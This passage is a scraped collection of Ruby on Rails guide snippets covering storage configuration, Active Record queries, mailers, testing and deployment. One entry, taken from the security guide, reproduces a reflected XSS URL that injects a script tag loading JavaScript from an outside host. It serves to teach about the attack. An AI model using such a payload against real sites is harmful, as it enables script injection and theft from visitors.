scenarios.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n# Use bin/rails credentials:edit to set the GCS secrets (as gcs:private_key_id|private_key)\ngoogle:\n  service: GCS\n  credentials:\n    type: \"service_account\"\n    project_id: \"\"\n    private_key_id: <%= Rails.application.credentials.dig(:gcs, :private_key_id) %>\n    private_key: <%= Rails.application.credentials.dig(:gcs, :private_key).dump %>\n    client_email: \"\"\n    client_id: \"\"\n    auth_uri: \"https://accounts.google.com/o/oauth2/auth\"\n    token_uri: \"https://accounts.google.com/o/oauth2/token\"\n    auth_provider_x509_cert_url: \"https://www.googleapis.com/oauth2/v1/certs\"\n    client_x509_cert_url: \"\"\n  project: \"\"\n  bucket: your_own_bucket-<%= Rails.env %>\n```\n\nLANGUAGE: yaml\nCODE:\n```\ngoogle:\n  service: GCS\n  ...\n  cache_control: \"public, max-age=3600\"\n```\n\nLANGUAGE: yaml\nCODE:\n```\ngoogle:\n  service: GCS\n  ...\n  iam: true\n```\n\nLANGUAGE: yaml\nCODE:\n```\ngoogle:\n  service: GCS\n  ...\n  iam: true\n  gsa_email: \"foobar@baz.iam.gserviceaccount.com\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Qmail Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from an SMTP relay using the Qmail ingress. This setting should be placed within the application's production environment configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :relay\n```\n\n----------------------------------------\n\nTITLE: Changing Date Components using change in Ruby\nDESCRIPTION: The `change` method creates a new date with specified components (year, month, day) modified. It raises an `ArgumentError` if the resulting date is invalid. It takes a hash as an argument where the keys are `:year`, `:month`, and `:day`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_153\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(2010, 12, 23).change(year: 2011, month: 11)\n# => Wed, 23 Nov 2011\n```\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(2010, 1, 31).change(month: 2)\n# => ArgumentError: invalid date\n```\n\n----------------------------------------\n\nTITLE: Interactive Console Example Showing Uniqueness Enforcement with Database Index\nDESCRIPTION: Demonstrates how a unique index raises an ActiveRecord::RecordNotUnique error when attempting to add the same article to a person twice, enforcing uniqueness at the database level.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_133\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.create(name: 'Honda')\nirb> article = Article.create(name: 'a1')\nirb> person.articles << article\nirb> person.articles << article\nActiveRecord::RecordNotUnique\n```\n\n----------------------------------------\n\nTITLE: Removing Subdirectory from Autoload Paths in Rails 6\nDESCRIPTION: This Ruby code shows how to remove a subdirectory from the autoload paths in Rails 6, which may be necessary when restructuring the application for Zeitwerk compatibility.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Dependencies.autoload_paths.delete(\"#{Rails.root}/app/api\")\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Test Scaffold Bash\nDESCRIPTION: Shows how to generate test scaffold code for existing controllers in Rails. This command creates functional tests for the seven default controller actions, using the `test_unit:scaffold` generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_38\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate test_unit:scaffold article\n```\n\n----------------------------------------\n\nTITLE: Action Cable Connection Test with Params (Ruby)\nDESCRIPTION: This test checks if a connection is established correctly with parameters. It uses the `connect` method to simulate a connection and then asserts that the `connection.user_id` is set to the correct value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_105\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationCable::ConnectionTest < ActionCable::Connection::TestCase\n  test \"connects with params\" do\n    # Simulate a connection opening by calling the `connect` method\n    connect params: { user_id: 42 }\n\n    # You can access the Connection object via `connection` in tests\n    assert_equal connection.user_id, \"42\"\n  end\n\n  test \"rejects connection without params\" do\n    # Use `assert_reject_connection` matcher to verify that\n    # connection is rejected\n    assert_reject_connection { connect }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using debug Helper in Rails Views\nDESCRIPTION: Demonstrates how to use the debug helper method to render an object in YAML format for inspection. This helper wraps the object in a pre tag for better readability in the browser.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_0\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= debug @article %>\n<p>\n  <b>Title:</b>\n  <%= @article.title %>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Engine Migration Comment Example - Ruby\nDESCRIPTION: This code shows an example comment included in migration files that originate from Rails Engines. These comments are important for identifying migrations provided by engines and handling them correctly during migration management.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\n# This migration comes from blorgh (originally 20210621082949)\n```\n\n----------------------------------------\n\nTITLE: Deep Duplicating Array (Ruby)\nDESCRIPTION: This snippet demonstrates the `Array#deep_dup` method, which creates a deep copy of an array and its contents. It ensures that changes made to the duplicated array do not affect the original. The example shows how nested arrays are also deeply duplicated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_128\n\nLANGUAGE: ruby\nCODE:\n```\narray = [1, [2, 3]]\ndup = array.deep_dup\ndup[1][2] = 4\narray[1][2] == nil   # => true\n```\n\n----------------------------------------\n\nTITLE: Google Cloud Storage CORS Configuration for Active Storage\nDESCRIPTION: JSON configuration for Google Cloud Storage Cross-Origin Resource Sharing (CORS) to allow direct uploads. This configuration defines the allowed origin, method, response headers, and cache duration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_68\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"origin\": [\"https://www.example.com\"],\n    \"method\": [\"PUT\"],\n    \"responseHeader\": [\"Content-Type\", \"Content-MD5\", \"Content-Disposition\"],\n    \"maxAgeSeconds\": 3600\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Using Nested Transactions in Active Record with requires_new Option\nDESCRIPTION: Demonstrates how to use nested transactions in Active Record, allowing you to roll back an inner transaction without affecting the outer transaction using the :requires_new option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nUser.transaction do\n  User.create(:username => 'Admin')\n  User.transaction(:requires_new => true) do\n    User.create(:username => 'Regular')\n    raise ActiveRecord::Rollback\n  end\nend\n\nUser.find(:all)  # => Returns only Admin\n```\n\n----------------------------------------\n\nTITLE: Specifying Singular Form via Inflector in Rails\nDESCRIPTION: Demonstrates how to override the singular form of a resource using `ActiveSupport::Inflector`. This is useful when the default singularization rules are not correct for a particular word.  Here tooth/teeth example is given.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Inflector.inflections do |inflect|\n  inflect.irregular \"tooth\", \"teeth\"\nend\n```\n\n----------------------------------------\n\nTITLE: Create User in Rails Console - IRB\nDESCRIPTION: This IRB command creates a new user in the database using the `User.create!` method.  It takes email address, password, and password confirmation as parameters. It raises an exception if the record cannot be created.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_68\n\nLANGUAGE: irb\nCODE:\n```\nUser.create! email_address: \"you@example.org\", password: \"s3cr3t\", password_confirmation: \"s3cr3t\"\n```\n\n----------------------------------------\n\nTITLE: Including Elements with including in Ruby\nDESCRIPTION: This example shows the `including` method, which returns a new enumerable that contains the original elements plus the passed elements. Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_114\n\nLANGUAGE: ruby\nCODE:\n```\n[ 1, 2, 3 ].including(4, 5)                    # => [ 1, 2, 3, 4, 5 ]\n[\"David\", \"Rafael\"].including %w[ Aaron Todd ] # => [\"David\", \"Rafael\", \"Aaron\", \"Todd\"]\n```\n\n----------------------------------------\n\nTITLE: Implementing a Welcome Email Method in UserMailer\nDESCRIPTION: Defines a welcome_email method in the UserMailer class that sets up instance variables for the email template and configures email headers like from, to, and subject.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  default from: \"notifications@example.com\"\n\n  def welcome_email\n    @user = params[:user]\n    @url  = \"http://example.com/login\"\n    mail(to: @user.email, subject: \"Welcome to My Awesome Site\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Cross-Database Associations with disable_joins\nDESCRIPTION: Example of defining associations across multiple databases in Rails 7.0+ using the disable_joins option to prevent join queries and instead perform multiple separate queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass Dog < AnimalsRecord\n  has_many :treats, through: :humans, disable_joins: true\n  has_many :humans\n\n  has_one :home\n  has_one :yard, through: :home, disable_joins: true\nend\n\nclass Home\n  belongs_to :dog\n  has_one :yard\nend\n\nclass Yard\n  belongs_to :home\nend\n```\n\n----------------------------------------\n\nTITLE: Registering a Parser for RSS Content\nDESCRIPTION: This code shows how to register a custom parser for RSS content using `register_parser`. This allows you to parse the rendered content of a view as RSS and access its elements for testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\nregister_parser :rss, -> rendered { RSS::Parser.parse(rendered) }\n\ntest \"renders RSS\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render formats: :rss, partial: article\n\n  assert_equal \"Hello, world\", rendered.rss.items.last.title\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Encryption Context with Custom Providers - Ruby\nDESCRIPTION: Illustrates how to set up custom key providers or encryptors for the global encryption context in Rails. This should be placed in an application or environment initializer to override default encryption provider behavior. Accepts class instances implementing the expected encryptor or key provider API.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.key_provider = ActiveRecord::Encryption::EnvelopeEncryptionKeyProvider.new\nconfig.active_record.encryption.encryptor = MyEncryptor.new\n```\n\n----------------------------------------\n\nTITLE: Reflected XSS attack URL example\nDESCRIPTION: An example URL that injects a malicious script via a reflected XSS attack. This exploits unescaped search parameters to load external JavaScript content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_43\n\nLANGUAGE: html\nCODE:\n```\nhttp://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->\n  <script src=http://www.securitylab.ru/test/sc.js></script><!--\n```\n\n----------------------------------------\n\nTITLE: Using after_deliver Callbacks in Rails Mailers\nDESCRIPTION: Shows implementation of after_deliver callbacks for tracking delivery status and implementing observer patterns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  after_deliver :mark_delivered\n  before_deliver :sandbox_staging\n  after_deliver :observe_delivery\n\n  def feedback_message\n    @feedback = params[:feedback]\n  end\n\n  private\n    def mark_delivered\n      params[:feedback].touch(:delivered_at)\n    end\n\n    def sandbox_staging\n      message.to = [\"sandbox@example.com\"] if Rails.env.staging?\n    end\n\n    def observe_delivery\n      EmailDelivery.log(message, self.class, action_name, params)\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Deploying the Application with Kamal\nDESCRIPTION: This command deploys the application to the production server using Kamal. It builds the Docker image, pushes it to the registry, and starts the application containers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_134\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/kamal deploy\n```\n\n----------------------------------------\n\nTITLE: Inspecting Module Parents with module_parent Ruby\nDESCRIPTION: This example demonstrates the usage of `module_parent` to retrieve the parent module of a nested module. It returns the immediate containing module in the module hierarchy. If the module is anonymous or top-level, it returns `Object`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nmodule X\n  module Y\n    module Z\n    end\n  end\nend\nM = X::Y::Z\n\nX::Y::Z.module_parent # => X::Y\nM.module_parent       # => X::Y\n```\n\n----------------------------------------\n\nTITLE: Defining Models with Association Scope within a Module\nDESCRIPTION: Example showing how models defined within the same module can reference each other using associations without needing explicit class names. The scope is automatically maintained within the module.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_100\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyApplication\n  module Business\n    class Supplier < ApplicationRecord\n      has_one :account\n    end\n\n    class Account < ApplicationRecord\n      belongs_to :supplier\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Render with Instance Variables (Rails/Ruby)\nDESCRIPTION: This example demonstrates how to render the `index` template directly from the `show` action while also setting up the necessary instance variables and displaying a flash message.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\ndef index\n  @books = Book.all\nend\n\ndef show\n  @book = Book.find_by(id: params[:id])\n  if @book.nil?\n    @books = Book.all\n    flash.now[:alert] = \"Your book was not found\"\n    render \"index\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition with Enum\nDESCRIPTION: Defines the Review model with belongs_to associations to Customer and Book models. It includes an enum for review state. This showcases the use of enums to define possible states for a model attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Review < ApplicationRecord\n  belongs_to :customer\n  belongs_to :book\n\n  enum :state, [:not_reviewed, :published, :hidden]\nend\n```\n\n----------------------------------------\n\nTITLE: Fetching All Records in Rails\nDESCRIPTION: This snippet retrieves all records from the `products` table using the `all` method in ActiveRecord.  It generates a SQL `SELECT` query without any filtering or ordering (beyond the default). It returns an `ActiveRecord::Relation` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_27\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.all\n```\n\nLANGUAGE: irb\nCODE:\n```\n  Product Load (0.3ms)  SELECT \"products\".* FROM \"products\" /* loading for pp */ LIMIT 11 /*application='Store'*/\n=>\n[#<Product:0x000000012c0f7300\n  id: 1,\n  name: \"Shoes\",\n  created_at: \"2024-12-02 20:29:56.303546000 +0000\",\n  updated_at: \"2024-12-02 20:30:14.127456000 +0000\">,\n #<Product:0x000000012c0f71c0\n  id: 2,\n  name: \"Pants\",\n  created_at: \"2024-12-02 20:30:02.997261000 +0000\",\n  updated_at: \"2024-12-02 20:30:02.997261000 +0000\">]\n```\n\n----------------------------------------\n\nTITLE: Building App with Middleware in Rackup::Server (Ruby)\nDESCRIPTION: This snippet demonstrates how the Rails application is built with middleware. It iterates through the middleware stack and applies each middleware to the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    private\n      def build_app(app)\n        middleware[options[:environment]].reverse_each do |middleware|\n          middleware = middleware.call(self) if middleware.respond_to?(:call)\n          next unless middleware\n          klass, *args = middleware\n          app = klass.new(app, *args)\n        end\n        app\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Deleting Session Data in Rails\nDESCRIPTION: This code shows how to remove data from the session, typically used when logging a user out. It deletes the `current_user_id` key from the session, effectively ending the user's session.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass SessionsController < ApplicationController\n  def destroy\n    session.delete(:current_user_id)\n    # Clear the current user as well.\n    @current_user = nil\n    redirect_to root_url, status: :see_other\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for exist_fragment?.action_controller in Ruby\nDESCRIPTION: This snippet illustrates the payload structure for the `exist_fragment?.action_controller` notification event. The payload is a Ruby hash containing the `:key` (as a symbol) with a string value representing the complete key checked for existence in the cache.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: 'posts/1-dashboard-view'\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing unauthorized host response in Rails\nDESCRIPTION: This code shows how to customize the Rack application response when a request is made to an unauthorized host.  It sets the `response_app` configuration option to a lambda that returns a 400 Bad Request response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.host_authorization = {\n  response_app: -> env do\n    [400, { \"Content-Type\" => \"text/plain\" }, [\"Bad Request\"]]\n  end\n}\n```\n\n----------------------------------------\n\nTITLE: SQLite3 Database Configuration (YAML)\nDESCRIPTION: This YAML code shows the default configuration for an SQLite3 database in the development environment. It specifies the adapter, database file path, connection pool size, and timeout. This demonstrates the basic setup for using SQLite3 with Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_86\n\nLANGUAGE: YAML\nCODE:\n```\ndevelopment:\n  adapter: sqlite3\n  database: storage/development.sqlite3\n  pool: 5\n  timeout: 5000\n```\n\n----------------------------------------\n\nTITLE: DRYing Up Form Layouts with Partials and Yield\nDESCRIPTION: This code demonstrates how to use `yield` with a partial to DRY up form layout definitions. It passes a form object to the partial, which then yields to render the specific form fields.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_73\n\nLANGUAGE: html\nCODE:\n```\n<%= render \"application/search_filters\", search: @q do |form| %>\n  <p>\n    Title contains: <%= form.text_field :title_contains %>\n  </p>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Displaying Validation Errors in Rails Views\nDESCRIPTION: This snippet shows how to display validation errors in a Rails view using ERB. It iterates through the errors and displays them in a list.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_75\n\nLANGUAGE: html\nCODE:\n```\n<% if @article.errors.any? %>\n  <div id=\"error_explanation\">\n    <h2><%= pluralize(@article.errors.count, \"error\") %> prohibited this article from being saved:</h2>\n\n    <ul>\n      <% @article.errors.each do |error| %>\n        <li><%= error.full_message %></li>\n      <% end %>\n    </ul>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Beginning and End of Hour Calculations in Ruby\nDESCRIPTION: The `beginning_of_hour` method returns a timestamp at the start of the hour (hh:00:00), while `end_of_hour` provides a timestamp at the end of the hour (hh:59:59). These methods operate on DateTime objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_156\n\nLANGUAGE: ruby\nCODE:\n```\ndate = DateTime.new(2010, 6, 7, 19, 55, 25)\ndate.beginning_of_hour # => Mon Jun 07 19:00:00 +0200 2010\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndate = DateTime.new(2010, 6, 7, 19, 55, 25)\ndate.end_of_hour # => Mon Jun 07 19:59:59 +0200 2010\n```\n\n----------------------------------------\n\nTITLE: Requiring Test Helper (Ruby)\nDESCRIPTION: This line requires the `test_helper.rb` file, which loads the default configuration for running tests and makes methods defined within it available to all tests. This ensures that the test environment is properly set up.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire \"test_helper\"\n```\n\n----------------------------------------\n\nTITLE: Starting Rails Server\nDESCRIPTION: Shows how to start the Rails server using bin/rails server command and its output showing server configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ cd my_app\n$ bin/rails server\n=> Booting Puma\n=> Rails 8.1.0 application starting in development\n=> Run `bin/rails server --help` for more startup options\nPuma starting in single mode...\n* Puma version: 6.4.0 (ruby 3.1.3-p185) (\"The Eagle of Durango\")\n*  Min threads: 5\n*  Max threads: 5\n*  Environment: development\n*          PID: 5295\n* Listening on http://127.0.0.1:3000\n* Listening on http://[::1]:3000\nUse Ctrl-C to stop\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with Alt Text in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper with `alt` text in Rails to generate an HTML `<img>` tag. It shows that if no `alt` is specified, the filename is used, capitalized and without the extension.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_56\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"home.gif\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"home.gif\", alt: \"Home\" %>\n```\n\n----------------------------------------\n\nTITLE: Using URL Helper Instead of Array Syntax with button_to in Rails 7.0 - Diff\nDESCRIPTION: Demonstrates how to modify button_to calls to use path helpers instead of array syntax for URLs when working with persisted Active Record objects in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n-button_to(\"Do a POST\", [:my_custom_post_action_on_workshop, Workshop.find(1)])\n+button_to(\"Do a POST\", my_custom_post_action_on_workshop_workshop_path(Workshop.find(1)))\n```\n\n----------------------------------------\n\nTITLE: Counter Cache Column Name using Demodulize\nDESCRIPTION: This snippet demonstrates how Active Record uses `demodulize` to generate the name of a counter cache column, which is used to efficiently track the number of associated records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\ndef counter_cache_column\n  if options[:counter_cache] == true\n    \"#{active_record.name.demodulize.underscore.pluralize}_count\"\n  elsif options[:counter_cache]\n    options[:counter_cache]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for read_fragment.action_controller in Ruby\nDESCRIPTION: This snippet shows an example payload for the `read_fragment.action_controller` notification event. The payload is a Ruby hash containing a `:key` symbol, whose value is a string representing the complete key used to read a cache fragment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: 'posts/1-dashboard-view'\n}\n```\n\n----------------------------------------\n\nTITLE: Default User Partial ERB Template\nDESCRIPTION: This snippet shows the default partial path for rendering a User instance. It uses `image_tag` to display the user's avatar and the user's name.  This is the default view rendered inside of the `<action-text-attachment>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_13\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/users/_user.html.erb %>\n<span><%= image_tag user.avatar %> <%= user.name %></span>\n```\n\n----------------------------------------\n\nTITLE: Using the Presence Validator in a Rails Model (Ruby)\nDESCRIPTION: Illustrates the use of the `presence` validator in an ActiveRecord model (`Person`). It ensures that the `name`, `login`, and `email` attributes are not blank (i.e., not nil or an empty/whitespace string).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, :login, :email, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Job with a specific queue using delimiter in Rails\nDESCRIPTION: This code snippet defines an Active Job named `EncoderJob` and assigns it to the `low_priority` queue using `queue_as`.  When combined with the prefix and delimiter configuration, the job will be queued on `video_server.low_priority` queue.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nclass EncoderJob < ActiveJob::Base\n  queue_as :low_priority\n  #....\nend\n```\n\n----------------------------------------\n\nTITLE: Querying with pick in Rails\nDESCRIPTION: Demonstrates how to use `pick` to retrieve the first value from specified columns in a relation. It's a shortcut for `relation.limit(1).pluck(*column_names).first`, useful when a relation is already limited to one row.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_199\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).pluck(:id).first\n```\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).pick(:id)\n```\n\n----------------------------------------\n\nTITLE: Strictly Creating Associated Account with Exception Handling - Ruby\nDESCRIPTION: Creates and saves an Account for a Supplier; raises ActiveRecord::RecordInvalid on failed validation. Demonstrates error handling and message output. Used for ensuring data integrity on creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n# This will raise ActiveRecord::RecordInvalid because the terms is blank\\nbegin\\n  @supplier.create_account!(terms: \\\"\\\")\\nrescue ActiveRecord::RecordInvalid => e\\n  puts e.message\\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Cable Worker Pool Size in Rails\nDESCRIPTION: This snippet demonstrates how to configure the worker pool size for Action Cable in a Rails application. The worker pool is used to handle connection callbacks and channel actions in isolation. The `worker_pool_size` option in `config.action_cable` determines the number of threads used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_cable.worker_pool_size = 4\n```\n\n----------------------------------------\n\nTITLE: Configuring Shard Selector Middleware in Rails\nDESCRIPTION: Example configuration for automatic shard switching using ShardSelector middleware. This initializer sets up a lock and defines a shard resolver based on the request host.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.configure do\n  config.active_record.shard_selector = { lock: true }\n  config.active_record.shard_resolver = ->(request) { Tenant.find_by!(host: request.host).shard }\nend\n```\n\n----------------------------------------\n\nTITLE: Caching SQL Query Results in Rails\nDESCRIPTION: This snippet demonstrates how to cache the result of an expensive SQL query using Rails.cache. It stores the super_admin_user_ids in the cache with a 12-hour expiration. The result is then used to fetch User records by their IDs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nids = Rails.cache.fetch(\"super_admin_user_ids\", expires_in: 12.hours) do\n  User.super_admins.pluck(:id)\nend\nUser.where(id: ids).to_a\n```\n\n----------------------------------------\n\nTITLE: NOT Condition with Nullable Column in Rails\nDESCRIPTION: Illustrates how `where.not` behaves with nullable columns.  A record with a null value will not be excluded from the results when checking against a non-null value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.create!(nullable_country: nil)\nCustomer.where.not(nullable_country: \"UK\")\n# => []\n\n# But\nCustomer.create!(nullable_country: \"UK\")\nCustomer.where.not(nullable_country: nil)\n# => [#<Customer id: 2, nullable_country: \"UK\">]\n```\n\n----------------------------------------\n\nTITLE: Querying multiple tables with pluck in Rails\nDESCRIPTION: Demonstrates how to use `pluck` to query fields from multiple tables using `joins`. This allows for retrieving data from related tables in a single query, efficiently gathering information across multiple entities.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_197\n\nLANGUAGE: irb\nCODE:\n```\nirb> Order.joins(:customer, :books).pluck(\"orders.created_at, customers.email, books.title\")\n```\n\n----------------------------------------\n\nTITLE: Using Custom Validation Contexts in Rails Console\nDESCRIPTION: This snippet shows how to use custom validation contexts in the Rails console to trigger specific validations. It demonstrates using the valid? method with a context parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nirb> user = User.new(name: \"John Doe\", age: 17, email: \"jane@example.com\", phone: \"1234567890\", address: \"123 Main St\")\nirb> user.valid?(:personal_info) # => false\nirb> user.valid?(:contact_info) # => true\nirb> user.valid?(:location_info) # => false\n```\n\n----------------------------------------\n\nTITLE: Using includes with ActiveRecord Associations for Eager Loading\nDESCRIPTION: Shows how to use the includes option in a has_one association to eager load a second-order association (representative), which improves efficiency when accessing nested associations frequently.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_120\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account, -> { includes :representative }\nend\n\nclass Account < ApplicationRecord\n  belongs_to :supplier\n  belongs_to :representative\nend\n\nclass Representative < ApplicationRecord\n  has_many :accounts\nend\n```\n\n----------------------------------------\n\nTITLE: Model Validation (Ruby)\nDESCRIPTION: This code adds a model-level validation to the `Article` model, requiring the `title` attribute to be present. This ensures that articles cannot be saved without a title, and helps demonstrate the impact of model validations on test results.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_9\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  validates :title, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Installing Specific Engine Migrations (Bash)\nDESCRIPTION: Copies pending database migrations from a specific engine ('blorgh') into the host application's `db/migrate` 